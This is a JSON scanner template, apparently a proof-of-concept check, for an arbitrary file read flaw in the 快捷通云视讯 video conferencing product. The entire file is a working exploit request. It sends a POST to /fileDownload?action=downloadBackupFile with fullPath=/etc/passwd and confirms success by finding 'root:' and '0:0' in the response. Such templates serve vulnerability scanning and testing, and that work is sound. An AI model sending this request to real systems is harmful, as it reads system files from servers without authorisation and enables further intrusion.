{
    "Name": "快捷通云视讯arbitrary-fileread",
    "Description": "快捷通云视讯arbitrary-fileread",
    "Product": "快捷通",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/fileDownload?action=downloadBackupFile",
        "Port":"",
        "Data":"fullPath=/etc/passwd",
        "follow_redirects":"false",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:"
                },
                {
                 "Operation": "contains", 
                 "Key":"",
                 "Value": "0:0"
                 },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
    ]}